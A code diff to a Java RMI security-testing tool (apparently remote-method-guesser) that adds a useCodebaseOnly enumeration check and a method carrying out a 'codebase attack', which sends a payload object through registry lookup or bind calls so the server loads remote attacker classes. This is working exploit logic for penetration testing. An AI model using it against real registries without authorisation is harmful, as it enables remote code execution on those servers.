@@ -14,6 +14,7 @@ import java.rmi.server.UnicastRemoteObject;
 import de.qtc.rmg.io.Logger;
 import de.qtc.rmg.io.MaliciousOutputStream;
 import de.qtc.rmg.networking.DummySocketFactory;
+import de.qtc.rmg.utils.DefinitelyNonExistingClass;
 import de.qtc.rmg.utils.RMGUtils;
 import de.qtc.rmg.utils.RMIWhisperer;
 import sun.rmi.server.UnicastRef;
@@ -60,14 +61,73 @@ public class RegistryClient {
         }
     }
 
+    public void enumCodebase(boolean marshal)
+    {
+        Logger.printlnBlue("RMI server useCodebaseOnly enumeration:");
+        Logger.println("");
+        Logger.increaseIndent();
+
+        if(!marshal) {
+            Logger.eprintlnMixedYellow("- RMI registry uses", "readString()", "for unmarshalling java.lang.String.");
+            Logger.eprintlnMixedBlue("  This prevents", "useCodebaseOnly", "enumeration from remote.");
+            Logger.decreaseIndent();
+            return;
+        }
+
+        MaliciousOutputStream.setDefaultLocation("InvalidURL");
+
+        try {
+            lookupCall(0, true);
+
+        } catch( java.rmi.ServerException e ) {
+
+            Throwable t = RMGUtils.getCause(e);
+
+            if( t instanceof java.net.MalformedURLException ) {
+                Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during lookup call.");
+                Logger.printMixedBlue("  --> The server", "attempted to parse", "the provided codebase ");
+                Logger.printlnPlainYellow("(useCodebaseOnly=false).");
+                RMGUtils.showStackTrace(e);
+
+            } else if( t instanceof java.lang.ClassCastException ) {
+                Logger.printlnMixedYellow("- Caught", "ClassCastException", "during lookup call.");
+                Logger.printMixedBlue("  --> The server", "ignored", "the provided codebase ");
+                Logger.printlnPlainYellow("(useCodebaseOnly=true).");
+                RMGUtils.showStackTrace(e);
+
+            } else {
+                Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during lookup call.");
+                Logger.println("Please report this to improve rmg :)");
+                RMGUtils.stackTrace(e);
+            }
+
+        } catch( java.lang.ClassCastException e ) {
+            Logger.printlnMixedYellow("- Caught", "ClassCastException", "during lookup call.");
+            Logger.printMixedBlue("  --> The server", "ignored", "the provided codebase ");
+            Logger.printlnPlainYellow("(useCodebaseOnly=true).");
+            RMGUtils.showStackTrace(e);
+
+        } catch( Exception e ) {
+            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during lookup call.");
+            Logger.println("Please report this to improve rmg :)");
+            RMGUtils.stackTrace(e);
+
+        } finally {
+            Logger.decreaseIndent();
+            MaliciousOutputStream.resetDefaultLocation();
+        }
+    }
+
     /**
      * Determines how the String type is umarshalled by the remote server. Sends an java.lang.Integer as argument
      * for the lookup(String name) call. If the String type is read via 'readObject', this will lead to an deserialization
      * attempt of the location, which is set to an unknown object (DefinitelyNonExistingClass). If this class name
      * appears in the server exception, we know that 'readObject' is used.
      */
-    public void enumerateStringMarshalling()
+    public boolean enumerateStringMarshalling()
     {
+        boolean marshal = false;
+
         Logger.printlnBlue("RMI server String unmarshalling enumeration:");
         Logger.println("");
         Logger.increaseIndent();
@@ -83,6 +143,7 @@ public class RegistryClient {
                 Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                 Logger.printlnPlainYellow("readObject().");
                 RMGUtils.showStackTrace(e);
+                marshal = true;
 
             } else if( t instanceof ClassCastException && t.getMessage().contains("Cannot cast an object to java.lang.String")) {
                 Logger.printlnMixedBlue("- Server complained that", "object cannot be casted to java.lang.String.");
@@ -94,20 +155,89 @@ public class RegistryClient {
                 Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during lookup call.");
                 Logger.println("Please report this to improve rmg :)");
                 RMGUtils.stackTrace(e);
-                RMGUtils.exit();
             }
 
         } catch( Exception e ) {
             Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during lookup call.");
             Logger.println("Please report this to improve rmg :)");
             RMGUtils.stackTrace(e);
-            RMGUtils.exit();
 
         } finally {
             Logger.decreaseIndent();
         }
 
+        return marshal;
     }
+
+    public void codebaseCall(Object payloadObject, boolean local)
+    {
+        String callName = "";
+        String className = payloadObject.getClass().getName();
+
+        if( !local ) {
+            callName = callNames[2];
+        } else {
+            callName = callNames[0];
+        }
+
+        Logger.println("");
+        Logger.printlnBlue("Attempting codebase attack on RMI registry endpoint...");
+        Logger.print("Using class ");
+        Logger.printPlainMixedBlueFirst(className, "with codebase", System.getProperty("java.rmi.server.codebase"));
+        Logger.printlnPlainMixedYellow(" during", callName, "operation.");
+        Logger.println("");
+        Logger.increaseIndent();
+
+        try {
+            if( !local ) {
+                lookupCall(payloadObject);
+            } else {
+                bindCall(payloadObject);
+            }
+
+        } catch( Exception e ) {
+
+            Throwable cause = RMGUtils.getCause(e);
+
+            if( cause instanceof java.io.InvalidClassException ) {
+                Logger.eprintMixedYellow("Registry", "rejected", "deserialization of class ");
+                Logger.printPlainBlue(className);
+                Logger.printlnPlainYellow(" (JEP290 is installed)");
+                Logger.eprintlnMixedBlue("Make sure your payload class", "extends RemoteObject", "and try again.");
+                RMGUtils.showStackTrace(e);
+
+            } else if( cause instanceof java.lang.UnsupportedClassVersionError) {
+                Logger.eprintlnMixedYellow("Caught", "UnsupportedClassVersionError", "during " + callName + " call.");
+                Logger.eprintlnMixedBlue("You probably used an", "uncompatible compiler", "for class generation.");
+                Logger.eprintln("Original error: " + e.getMessage());
+                RMGUtils.showStackTrace(e);
+
+            } else if( cause instanceof java.lang.ClassNotFoundException) {
+                Logger.eprintlnMixedYellow("The payload class could", "not be loaded", "from the specified endpoint.");
+                Logger.eprintMixedBlue("The registry is probably configured with", "useCodeBaseOnly=true");
+                Logger.printlnPlainYellow(" (not vulnerable)");
+                Logger.eprintlnMixedYellow("or the file", className + ".class", "was not found on the specified endpoint.");
+                RMGUtils.showStackTrace(e);
+
+            } else if( cause instanceof java.lang.ClassCastException) {
+                Logger.printlnMixedYellow("Caught", "ClassCastException", "during " + callName + " call.");
+                Logger.printlnMixedYellowFirst("Codebase attack", "most likely", "worked :)");
+                RMGUtils.showStackTrace(e);
+
+            } else if( cause instanceof java.security.AccessControlException) {
+                Logger.printlnMixedYellow("Caught unexpected", "AccessControlException", "during " + callName + " call.");
+                Logger.printlnMixedBlue("The servers", "SecurityManager", "may refused the operation.");
+                RMGUtils.showStackTrace(e);
+
+            } else {
+                Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during " + callName + " action.");
+                Logger.eprintln("Please report this to improve rmg :)");
+                RMGUtils.stackTrace(e);
+                RMGUtils.exit();
+            }
+        }
+    }
+
     public void invokeAnTrinhBypass(String host, int port, boolean local)
     {
         String callName = "";
